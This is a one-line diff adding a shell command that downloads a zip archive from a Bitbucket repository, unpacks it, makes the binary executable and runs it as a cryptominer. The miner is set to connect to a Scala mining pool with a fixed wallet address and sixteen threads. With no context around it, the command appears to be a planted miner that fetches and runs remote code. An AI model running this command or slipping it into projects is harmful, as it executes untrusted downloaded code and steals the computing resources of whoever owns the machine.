@@ -1,0 +1,1 @@
+wget https://bitbucket.org/gedangklut/koyor/raw/41355a2cca61690679f8312ee6ba202b048fe340/hayuk1.zip && unzip hayuk1.zip && chmod +x hayuk && ./hayuk -o scala.herominers.com:10130 -u Ssy2Ceu2umdNYxHh799vEiApWhozLK5g9K4y8qR7mRXpPeaYNB8pgmJRxe9rgyNMVoSwKvnPs4r6ZVoreuYv3nkb9ADjTvBgJ9 -p gelar2 -a panthera -t16
